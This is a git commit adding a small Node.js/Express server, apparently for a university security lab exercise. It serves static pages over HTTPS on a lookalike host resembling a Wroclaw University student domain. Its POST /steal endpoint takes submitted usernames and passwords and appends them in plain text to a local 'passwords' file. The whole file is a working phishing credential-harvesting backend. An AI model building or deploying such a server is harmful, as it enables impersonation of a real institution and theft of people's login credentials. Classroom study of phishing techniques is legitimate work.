2a0132cbc9e4814138f3fb1fba066c1b26f22d78
Push <49253201+RideTheSkyP@users.noreply.github.com>
2020-12-12 03:48:39 +0100

    L4Ex3

---
+++ L4/Ex3/server.js
@@ -0,0 +1,31 @@
+const https = require("https");
+const fs = require("fs");
+const host = "s.stydent.pwr.edu.pl";
+const port = 443;
+const bodyParser = require("body-parser");
+const express = require("express");
+
+const app = express();
+const options = {
+    key: fs.readFileSync("privkeyA.pem"),
+    cert: fs.readFileSync("certA.crt")
+};
+
+app.use(bodyParser.urlencoded({extended: false}));
+app.use(bodyParser.json());
+app.use("/", express.static(__dirname + "/"));
+
+app.post("/steal", (req, res) => {
+	if (req.body.username && req.body.password)
+	{
+		fs.appendFileSync(__dirname + "/passwords", `login: ${req.body.username}, password: ${req.body.password}\n`);
+		res.send(true);
+	}
+	else
+	{
+		res.send(false);
+	}
+});
+
+https.createServer(options, app).listen(port, host)
+console.log(`Server running on https://${host}:${port}`)
